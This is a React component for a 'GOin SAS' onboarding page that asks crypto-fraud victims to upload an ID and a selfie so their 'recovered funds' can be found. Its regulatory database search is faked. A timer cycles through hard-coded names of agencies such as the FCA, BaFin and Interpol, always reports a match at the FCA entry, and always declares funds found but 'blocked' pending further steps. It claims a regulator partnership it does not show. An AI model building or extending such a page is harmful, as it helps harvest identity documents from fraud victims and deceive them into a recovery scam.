import React, { useState, useEffect, useRef } from "react";
import { Link, useNavigate } from "react-router-dom";
import { useAuthUser } from "react-auth-kit";
import { toast } from "react-toastify";
import {
  Upload,
  CheckCircle2,
  Loader2,
  Shield,
  Search,
  Wallet,
  ArrowRight,
  Lock,
  Database,
  Camera,
  User,
} from "lucide-react";
import GoinLogo from "../kycPortal/GoinLogo";
import "../kycPortal/kyc-portal.css";
import {
  verifySingleUserApi,
  completeMySignupKycApi,
  signleUsersApi,
  getRestrictionsApi,
} from "../../../Api/Service";

const VERIFICATION_DURATION = 135; // 2 minutes 15 seconds

const DATABASES = [
  { name: "France - AMF Database", flag: "🇫🇷" },
  { name: "Germany - BaFin Registry", flag: "🇩🇪" },
  { name: "Belgium - FSMA Records", flag: "🇧🇪" },
  { name: "United Kingdom - FCA Database", flag: "🇬🇧" },
  { name: "Netherlands - AFM Registry", flag: "🇳🇱" },
  { name: "Switzerland - FINMA Records", flag: "🇨🇭" },
  { name: "Luxembourg - CSSF Database", flag: "🇱🇺" },
  { name: "Spain - CNMV Registry", flag: "🇪🇸" },
  { name: "Italy - CONSOB Database", flag: "🇮🇹" },
  { name: "Austria - FMA Records", flag: "🇦🇹" },
  { name: "European Union - ESMA Central", flag: "🇪🇺" },
  { name: "Interpol - Financial Crimes", flag: "🌐" },
  { name: "International Recovery Fund", flag: "🌐" },
];

const ALLOWED_ID_TYPES = ["image/jpeg", "image/jpg", "image/png", "application/pdf"];
const ALLOWED_SELFIE_TYPES = ["image/jpeg", "image/jpg", "image/png"];
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

export default function OnboardingKycPage() {
  const navigate = useNavigate();
  const authUser = useAuthUser();

  const [step, setStep] = useState("upload"); // "upload" | "verification" | "complete"
  const [identityFile, setIdentityFile] = useState(null);
  const [selfieFile, setSelfieFile] = useState(null);
  const [selfiePreview, setSelfiePreview] = useState(null);
  const [verificationProgress, setVerificationProgress] = useState(0);
  const [currentDatabase, setCurrentDatabase] = useState(0);
  const [completedDatabases, setCompletedDatabases] = useState([]);
  const [isUploading, setIsUploading] = useState(false);
  const [fcaMatchFound, setFcaMatchFound] = useState(false);
  const [fcaMatchVisible, setFcaMatchVisible] = useState(false);

  const videoRef = useRef(null);
  const [isCameraOpen, setIsCameraOpen] = useState(false);
  const [stream, setStream] = useState(null);

  useEffect(() => {
    document.documentElement.classList.add("kyc-portal-active");
    return () => {
      document.documentElement.classList.remove("kyc-portal-active");
    };
  }, []);

  // Check user's current onboarding state on mount
  useEffect(() => {
    let cancelled = false;
    const checkStatus = async () => {
      const current = authUser()?.user;
      if (!current?._id) return;
      try {
        const [uRes, rRes] = await Promise.all([
          signleUsersApi(current._id),
          getRestrictionsApi(),
        ]);
        if (cancelled) return;
        const requireSignupKyc = rRes?.data?.requireSignupKyc !== false;
        const u = uRes?.signleUser;
        if (!requireSignupKyc || u?.signupKycCompleted || u?.kyc) {
          navigate("/dashboard", { replace: true });
          return;
        }
        if (u?.signupKycRequired && !u?.fiscalProfile?.completedAt) {
          navigate("/fiscal-profile", { replace: true });
          return;
        }
        // If user already uploaded both documents earlier but refreshed before completing 100% banking check progress:
        if (u?.submitDoc?.cnic && u?.submitDoc?.bill && !u?.signupKycCompleted) {
          setStep("verification");
        }
      } catch (_err) {
        // ignore
      }
    };
    checkStatus();
    return () => {
      cancelled = true;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const getProgress = () => {
    switch (step) {
      case "upload":
        return 33;
      case "verification":
        return 66;
      case "complete":
        return 100;
      default:
        return 33;
    }
  };

  const handleIdentityUpload = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const isPdfExt = file.name?.toLowerCase().endsWith(".pdf");
    if (!ALLOWED_ID_TYPES.includes(file.type) && !isPdfExt) {
      toast.error("Invalid format. Accepted formats: JPG, PNG or PDF (max 10 MB)");
      e.target.value = "";
      return;
    }

    if (file.size > MAX_FILE_SIZE) {
      toast.error("File too large. Maximum file size is 10 MB");
      e.target.value = "";
      return;
    }

    setIdentityFile(file);
    toast.success(`Document selected: ${file.name}`);
  };

  const handleSelfieUpload = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!ALLOWED_SELFIE_TYPES.includes(file.type)) {
      toast.error("Invalid format. Accepted formats: JPG or PNG (max 10 MB)");
      e.target.value = "";
      return;
    }

    if (file.size > MAX_FILE_SIZE) {
      toast.error("File too large. Maximum file size is 10 MB");
      e.target.value = "";
      return;
    }

    setSelfieFile(file);
    const reader = new FileReader();
    reader.onloadend = () => {
      setSelfiePreview(reader.result);
    };
    reader.readAsDataURL(file);
    toast.success("Your selfie has been selected");
  };

  const openCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
      });
      setStream(mediaStream);
      setIsCameraOpen(true);
    } catch (error) {
      console.error("Camera access error:", error);
      toast.error("Camera access denied. Please allow camera access or upload a photo instead.");
    }
  };

  const capturePhoto = () => {
    if (videoRef.current) {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      if (ctx) {
        ctx.drawImage(videoRef.current, 0, 0);
        canvas.toBlob(
          (blob) => {
            if (blob) {
              const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
              setSelfieFile(file);
              setSelfiePreview(canvas.toDataURL("image/jpeg"));
              closeCamera();
              toast.success("Your selfie has been captured successfully");
            }
          },
          "image/jpeg",
          0.9
        );
      }
    }
  };

  const closeCamera = () => {
    if (stream) {
      stream.getTracks().forEach((track) => track.stop());
      setStream(null);
    }
    setIsCameraOpen(false);
  };

  useEffect(() => {
    if (isCameraOpen && stream && videoRef.current) {
      videoRef.current.srcObject = stream;
    }
  }, [isCameraOpen, stream]);

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };
  }, [stream]);

  const handleSubmit = async () => {
    if (!identityFile || !selfieFile) return;

    const currentUser = authUser()?.user;
    if (!currentUser?._id) {
      toast.error("Session expired. Please sign in again.");
      navigate("/auth/login");
      return;
    }

    setIsUploading(true);
    try {
      const formData = new FormData();
      formData.append("id", currentUser._id);
      formData.append("cnic", identityFile);
      formData.append("bill", selfieFile);

      const res = await verifySingleUserApi(formData);
      if (res?.success) {
        setStep("verification");
        setVerificationProgress(0);
        setCurrentDatabase(0);
        setCompletedDatabases([]);
        setFcaMatchFound(false);
        setFcaMatchVisible(false);
      } else {
        toast.error(res?.message || res?.msg || "Upload failed. Please try again.");
      }
    } catch (error) {
      console.error("KYC upload error:", error);
      toast.error(
        error?.data?.message ||
          error?.data?.msg ||
          error?.message ||
          "Upload failed. Please try again."
      );
    } finally {
      setIsUploading(false);
    }
  };

  // Verification progress percentage timer (0 -> 100% over VERIFICATION_DURATION)
  useEffect(() => {
    if (step !== "verification") return undefined;

    const progressInterval = setInterval(() => {
      setVerificationProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return Math.min(100, prev + 100 / VERIFICATION_DURATION);
      });
    }, 1000);

    return () => clearInterval(progressInterval);
  }, [step]);

  // Database-by-database check timer
  useEffect(() => {
    if (step !== "verification") return undefined;

    const dbInterval = setInterval(() => {
      setCurrentDatabase((prev) => {
        const next = prev + 1;
        setCompletedDatabases((completed) =>
          completed.includes(prev) ? completed : [...completed, prev]
        );
        // FCA is index 3 - trigger match notification when it completes
        if (prev === 3) {
          setFcaMatchFound(true);
          setTimeout(() => setFcaMatchVisible(true), 300);
        }
        if (next >= DATABASES.length) {
          clearInterval(dbInterval);
          setVerificationProgress(100);
          // Mark signup KYC & banking check as 100% completed on the backend
          completeMySignupKycApi()
            .then(() => {
              window.dispatchEvent(new Event("signup-kyc-updated"));
            })
            .catch(() => {});
          setTimeout(() => setStep("complete"), 2000);
          return prev;
        }
        return next;
      });
    }, (VERIFICATION_DURATION * 1000) / DATABASES.length);

    return () => clearInterval(dbInterval);
  }, [step]);

  const handleComplete = async () => {
    try {
      await completeMySignupKycApi();
      window.dispatchEvent(new Event("signup-kyc-updated"));
    } catch (_err) {
      // already completed
    }
    navigate("/dashboard", { replace: true });
  };

  const formatTime = () => {
    const remaining = Math.max(
      0,
      VERIFICATION_DURATION -
        Math.floor((verificationProgress / 100) * VERIFICATION_DURATION)
    );
    const mins = Math.floor(remaining / 60);
    const secs = remaining % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  return (
    <div id="kyc-portal">
      <div
        className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100/70 text-slate-900 notranslate"
        translate="no"
      >
        {/* Sticky SimpleHeader */}
        <header className="sticky top-0 z-50 border-b border-slate-200 bg-white/85 backdrop-blur-sm">
          <div className="max-w-6xl mx-auto flex h-14 items-center justify-between px-4 sm:px-6">
            <Link to="/" title="GOin SAS">
              <GoinLogo height={34} width={136} theme="light" />
            </Link>
            <div className="flex items-center gap-1.5 text-xs font-medium text-slate-500">
              <Lock className="h-3.5 w-3.5 text-emerald-600" />
              <span>Secure connection</span>
            </div>
          </div>
        </header>

        {/* Top Progress Bar */}
        <div className="border-b border-slate-200 bg-white">
          <div className="max-w-6xl mx-auto py-3 px-4 sm:px-6">
            <div className="w-full h-1.5 bg-slate-100 rounded-full overflow-hidden">
              <div
                className="h-full bg-blue-600 rounded-full transition-all duration-500"
                style={{ width: `${getProgress()}%` }}
              />
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-6xl mx-auto py-8 lg:py-12 px-4 sm:px-6">
          <div className="mx-auto max-w-2xl">
            {/* STEP 1: UPLOAD */}
            {step === "upload" && (
              <div className="space-y-6">
                {/* Visual Steps */}
                <div className="flex items-center justify-center gap-3">
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-blue-600 text-white shadow-md">
                      <Upload className="h-6 w-6" />
                    </div>
                    <span className="text-xs font-semibold text-slate-900">Upload</span>
                  </div>
                  <div className="h-0.5 w-6 bg-slate-200" />
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-slate-200/80 text-slate-500">
                      <Search className="h-6 w-6" />
                    </div>
                    <span className="text-xs text-slate-500">Check</span>
                  </div>
                  <div className="h-0.5 w-6 bg-slate-200" />
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-slate-200/80 text-slate-500">
                      <Wallet className="h-6 w-6" />
                    </div>
                    <span className="text-xs text-slate-500">Access</span>
                  </div>
                </div>

                {/* Title */}
                <div className="text-center">
                  <h1 className="mb-2 text-2xl font-extrabold text-slate-900">
                    Identity Verification
                  </h1>
                  <p className="text-sm text-slate-500">
                    Required to access your recovered funds
                  </p>
                </div>

                {/* Explanation Card */}
                <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm">
                  <p className="mb-4 font-bold text-slate-900">
                    Why do we need your ID?
                  </p>
                  <div className="space-y-3 text-sm text-slate-600">
                    <div className="flex gap-3">
                      <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-blue-600/10 text-xs font-bold text-blue-600">
                        1
                      </div>
                      <p>
                        When crypto platforms are{" "}
                        <strong className="text-slate-900">shut down for fraud</strong>,
                        authorities recover the funds deposited by victims.
                      </p>
                    </div>
                    <div className="flex gap-3">
                      <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-blue-600/10 text-xs font-bold text-blue-600">
                        2
                      </div>
                      <p>
                        GOin SAS{" "}
                        <strong className="text-slate-900">
                          partners with regulators
                        </strong>{" "}
                        to return these funds to their rightful owners.
                      </p>
                    </div>
                    <div className="flex gap-3">
                      <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-blue-600/10 text-xs font-bold text-blue-600">
                        3
                      </div>
                      <p>
                        Your ID lets us{" "}
                        <strong className="text-slate-900">
                          search international databases
                        </strong>{" "}
                        to check if any recovered funds belong to you.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Upload Areas */}
                <div className="space-y-4">
                  {/* ID Upload */}
                  <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-white p-5 transition-all hover:border-blue-500">
                    <input
                      type="file"
                      id="identity-upload"
                      accept=".jpg,.jpeg,.png,.pdf"
                      onChange={handleIdentityUpload}
                      className="hidden"
                    />
                    <label
                      htmlFor="identity-upload"
                      className="flex cursor-pointer items-center gap-4"
                    >
                      {identityFile ? (
                        <>
                          <div className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-emerald-500/10">
                            <CheckCircle2 className="h-7 w-7 text-emerald-600" />
                          </div>
                          <div className="flex-1 min-w-0">
                            <p className="font-bold text-slate-900">ID Document</p>
                            <p className="text-sm text-emerald-600 truncate">
                              {identityFile.name}
                            </p>
                          </div>
                        </>
                      ) : (
                        <>
                          <div className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-slate-100">
                            <Upload className="h-7 w-7 text-slate-500" />
                          </div>
                          <div className="flex-1">
                            <p className="font-bold text-slate-900">Upload your ID</p>
                            <p className="text-sm text-slate-500">
                              Passport, ID card or license
                            </p>
                          </div>
                        </>
                      )}
                    </label>
                  </div>

                  {/* Selfie Upload / Camera */}
                  <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-white p-5 transition-all hover:border-blue-500">
                    <input
                      type="file"
                      id="selfie-upload"
                      accept=".jpg,.jpeg,.png"
                      onChange={handleSelfieUpload}
                      className="hidden"
                    />

                    {isCameraOpen ? (
                      <div className="space-y-4">
                        <div className="relative overflow-hidden rounded-xl bg-slate-900">
                          <video
                            ref={videoRef}
                            autoPlay
                            playsInline
                            muted
                            className="w-full rounded-xl"
                          />
                        </div>
                        <div className="flex gap-2">
                          <button
                            type="button"
                            onClick={capturePhoto}
                            className="flex-1 h-10 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-sm font-bold flex items-center justify-center gap-2"
                          >
                            <Camera className="h-4 w-4" />
                            Take Photo
                          </button>
                          <button
                            type="button"
                            onClick={closeCamera}
                            className="px-4 h-10 rounded-xl border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 text-sm font-semibold"
                          >
                            Cancel
                          </button>
                        </div>
                      </div>
                    ) : selfiePreview ? (
                      <div className="flex items-center gap-4">
                        <div className="relative h-14 w-14 shrink-0 overflow-hidden rounded-full">
                          <img
                            src={selfiePreview}
                            alt="Selfie preview"
                            className="h-full w-full object-cover"
                          />
                          <div className="absolute inset-0 flex items-center justify-center bg-emerald-500/20">
                            <CheckCircle2 className="h-6 w-6 text-emerald-600" />
                          </div>
                        </div>
                        <div className="flex-1">
                          <p className="font-bold text-slate-900">Photo Verified</p>
                          <p className="text-sm text-emerald-600">Selfie captured</p>
                        </div>
                        <div className="flex items-center gap-2">
                          <button
                            type="button"
                            onClick={openCamera}
                            className="px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-700 hover:bg-slate-100"
                          >
                            Retake
                          </button>
                          <label
                            htmlFor="selfie-upload"
                            className="cursor-pointer rounded-lg px-3 py-1.5 text-xs font-semibold text-blue-600 hover:bg-blue-50"
                          >
                            Upload
                          </label>
                        </div>
                      </div>
                    ) : (
                      <div className="flex flex-col gap-4">
                        <label
                          htmlFor="selfie-upload"
                          className="flex cursor-pointer items-center gap-4"
                        >
                          <div className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-slate-100">
                            <User className="h-7 w-7 text-slate-500" />
                          </div>
                          <div className="flex-1">
                            <p className="font-bold text-slate-900">Take a selfie</p>
                            <p className="text-sm text-slate-500">
                              Click to upload or use camera
                            </p>
                          </div>
                        </label>
                        <div className="flex justify-center">
                          <button
                            type="button"
                            onClick={(e) => {
                              e.preventDefault();
                              openCamera();
                            }}
                            className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 text-xs font-semibold text-slate-700 transition-all"
                          >
                            <Camera className="h-3.5 w-3.5 text-blue-600" />
                            Use Camera
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                {/* Security Badge */}
                <div className="flex items-center justify-center gap-2 text-sm text-slate-500">
                  <Shield className="h-4 w-4 text-emerald-600" />
                  <span>Your data is encrypted and secure</span>
                </div>

                {/* CTA */}
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!identityFile || !selfieFile || isUploading}
                  className="w-full h-12 rounded-xl bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-base flex items-center justify-center gap-2 shadow-sm transition-all"
                >
                  {isUploading ? (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" />
                      <span>Uploading documents...</span>
                    </>
                  ) : (
                    <>
                      <span>Verify my identity</span>
                      <ArrowRight className="h-5 w-5" />
                    </>
                  )}
                </button>
              </div>
            )}

            {/* STEP 2: VERIFICATION (INTERNATIONAL BANKING & REGULATORY DATABASE CHECK) */}
            {step === "verification" && (
              <div className="space-y-6">
                {/* Visual Steps */}
                <div className="flex items-center justify-center gap-3">
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-emerald-600 text-white">
                      <CheckCircle2 className="h-6 w-6" />
                    </div>
                    <span className="text-xs font-semibold text-emerald-600">Done</span>
                  </div>
                  <div className="h-0.5 w-6 bg-emerald-600" />
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-blue-600 text-white shadow-md">
                      <Loader2 className="h-6 w-6 animate-spin" />
                    </div>
                    <span className="text-xs font-semibold text-slate-900">
                      Checking
                    </span>
                  </div>
                  <div className="h-0.5 w-6 bg-slate-200" />
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-slate-200/80 text-slate-500">
                      <Wallet className="h-6 w-6" />
                    </div>
                    <span className="text-xs text-slate-500">Access</span>
                  </div>
                </div>

                {/* Main Loading */}
                <div className="py-4 text-center">
                  <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-blue-600/10">
                    <Database className="h-10 w-10 text-blue-600 animate-pulse" />
                  </div>
                  <h1 className="mb-2 text-xl font-extrabold text-slate-900">
                    Searching databases...
                  </h1>
                  <p className="text-sm text-slate-500">
                    Checking international financial records
                  </p>
                </div>

                {/* Progress Bar */}
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-slate-500">Progress</span>
                    <span className="font-bold text-slate-900">
                      {Math.round(verificationProgress)}%
                    </span>
                  </div>
                  <div className="w-full h-3 bg-slate-200 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-blue-600 rounded-full transition-all duration-700"
                      style={{ width: `${Math.min(100, verificationProgress)}%` }}
                    />
                  </div>
                  <div className="flex justify-between text-xs text-slate-500">
                    <span>
                      {completedDatabases.length} / {DATABASES.length} databases checked
                    </span>
                    <span>~{formatTime()} remaining</span>
                  </div>
                </div>

                {/* Current Database */}
                <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
                  <p className="mb-3 text-xs font-bold uppercase tracking-wider text-slate-400">
                    Currently checking
                  </p>
                  <div className="flex items-center gap-3">
                    <Loader2 className="h-5 w-5 animate-spin text-blue-600" />
                    <span className="text-2xl">
                      {DATABASES[currentDatabase]?.flag}
                    </span>
                    <span className="font-bold text-slate-900">
                      {DATABASES[currentDatabase]?.name}
                    </span>
                  </div>
                </div>

                {/* Completed Databases */}
                <div className="max-h-52 space-y-2 overflow-y-auto rounded-2xl border border-slate-200 bg-slate-100/70 p-3">
                  <p className="mb-2 text-xs font-bold uppercase tracking-wider text-slate-400">
                    Completed
                  </p>
                  {completedDatabases.length === 0 ? (
                    <p className="py-2 text-center text-sm text-slate-500">
                      Starting verification...
                    </p>
                  ) : (
                    completedDatabases.map((dbIndex) => (
                      <div
                        key={dbIndex}
                        className={`flex items-center gap-2 rounded-xl p-2.5 text-sm ${
                          dbIndex === 3
                            ? "bg-emerald-500/10 border border-emerald-500/30"
                            : "bg-white border border-slate-200/60"
                        }`}
                      >
                        <CheckCircle2
                          className={`h-4 w-4 shrink-0 ${
                            dbIndex === 3 ? "text-emerald-600" : "text-emerald-500"
                          }`}
                        />
                        <span>{DATABASES[dbIndex]?.flag}</span>
                        <span
                          className={
                            dbIndex === 3
                              ? "font-bold text-emerald-800"
                              : "text-slate-600"
                          }
                        >
                          {DATABASES[dbIndex]?.name}
                        </span>
                        {dbIndex === 3 && (
                          <span className="ml-auto text-xs font-extrabold text-emerald-600">
                            Match ✓
                          </span>
                        )}
                      </div>
                    ))
                  )}
                </div>

                {/* FCA Match Notification */}
                {fcaMatchFound && (
                  <div
                    className={`rounded-2xl border-2 border-emerald-500/50 bg-emerald-50/90 p-4 transition-all duration-700 ease-out ${
                      fcaMatchVisible
                        ? "opacity-100 translate-y-0 scale-100"
                        : "opacity-0 translate-y-4 scale-95"
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-emerald-500/20 animate-pulse">
                        <CheckCircle2 className="h-5 w-5 text-emerald-600" />
                      </div>
                      <div className="flex-1">
                        <div className="flex items-center gap-2">
                          <span className="text-lg">🇬🇧</span>
                          <p className="font-bold text-emerald-800">
                            Account found — FCA (United Kingdom)
                          </p>
                        </div>
                        <p className="mt-1 text-sm text-emerald-900/80">
                          A recoverable account registered with the Financial Conduct
                          Authority has been identified. Verification will continue with
                          the remaining databases.
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                {/* Warning */}
                <div className="flex items-center gap-2 rounded-xl bg-amber-500/10 border border-amber-500/25 p-3 text-sm font-medium text-amber-800">
                  <Lock className="h-4 w-4 shrink-0 text-amber-600" />
                  <span>Please do not close this page during verification</span>
                </div>
              </div>
            )}

            {/* STEP 3: COMPLETE */}
            {step === "complete" && (
              <div className="space-y-6">
                {/* Visual Steps */}
                <div className="flex items-center justify-center gap-3">
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-emerald-600 text-white">
                      <CheckCircle2 className="h-6 w-6" />
                    </div>
                    <span className="text-xs font-semibold text-emerald-600">Done</span>
                  </div>
                  <div className="h-0.5 w-6 bg-emerald-600" />
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-emerald-600 text-white">
                      <CheckCircle2 className="h-6 w-6" />
                    </div>
                    <span className="text-xs font-semibold text-emerald-600">Done</span>
                  </div>
                  <div className="h-0.5 w-6 bg-emerald-600" />
                  <div className="flex flex-col items-center gap-1.5">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-emerald-600 text-white shadow-md">
                      <Wallet className="h-6 w-6" />
                    </div>
                    <span className="text-xs font-bold text-emerald-600">Ready</span>
                  </div>
                </div>

                {/* Success */}
                <div className="py-4 text-center">
                  <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-emerald-500/10">
                    <CheckCircle2 className="h-10 w-10 text-emerald-600" />
                  </div>
                  <h1 className="mb-2 text-2xl font-extrabold text-slate-900">
                    Verification Complete!
                  </h1>
                  <p className="text-sm text-slate-500">
                    We found funds linked to your identity
                  </p>
                </div>

                {/* Stats */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center shadow-sm">
                    <p className="text-2xl font-extrabold text-blue-600">
                      {DATABASES.length}
                    </p>
                    <p className="text-xs font-medium text-slate-500 mt-0.5">
                      Databases checked
                    </p>
                  </div>
                  <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center shadow-sm">
                    <p className="text-2xl font-extrabold text-emerald-600">1</p>
                    <p className="text-xs font-medium text-slate-500 mt-0.5">
                      Match found
                    </p>
                  </div>
                </div>

                {/* Result Card */}
                <div className="rounded-2xl border border-amber-500/30 bg-amber-50/70 p-5">
                  <div className="flex items-start gap-4">
                    <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-amber-500/20">
                      <Wallet className="h-6 w-6 text-amber-600" />
                    </div>
                    <div>
                      <p className="font-bold text-slate-900">Recovered funds found</p>
                      <p className="mt-1 text-sm text-slate-600">
                        These funds appear as{" "}
                        <strong className="text-slate-900">&quot;blocked&quot;</strong>{" "}
                        in your dashboard. Complete the required steps to unlock them.
                      </p>
                    </div>
                  </div>
                </div>

                {/* CTA */}
                <button
                  type="button"
                  onClick={handleComplete}
                  className="w-full h-12 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-base flex items-center justify-center gap-2 shadow-sm transition-all"
                >
                  <span>Access my dashboard</span>
                  <ArrowRight className="h-5 w-5" />
                </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
